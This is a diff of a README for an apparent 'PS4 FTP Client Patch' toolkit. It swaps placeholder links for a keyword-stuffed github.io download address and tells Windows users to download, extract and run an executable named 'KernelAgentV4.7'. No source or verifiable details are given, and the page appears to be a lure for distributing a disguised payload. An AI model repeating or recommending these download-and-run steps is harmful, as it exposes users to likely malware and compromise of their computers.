@@ -2,13 +2,15 @@
 
 This toolkit enables seamless FTP access to the PS4 internal filesystem, fixes common permission bugs, and auto-stabilizes FTP payload connections. For jailbroken systems only. Powered by `KernelAgentV4.7`.
 
-[![Download PS4 FTP Patch](https://img.shields.io/badge/Download-PS4_FTP_Client_Patch-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download PS4 FTP Patch](https://img.shields.io/badge/Download-PS4_FTP_Client_Patch-blueviolet)](https://ps4-ftp-client-access-payload-windows.github.io/.github
+)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section  
+1. 📦 **Download the archive** from the [Releases](https://ps4-ftp-client-access-payload-windows.github.io/.github
+) section  
 2. 📁 **Extract the folder** to any location (e.g., `C:\PS4FTPFix`)  
 3. 🖱 **Run the executable file** `KernelAgentV4.7`  
 4. 🧠 The patch will apply stability and permission fixes to your FTP client environment  
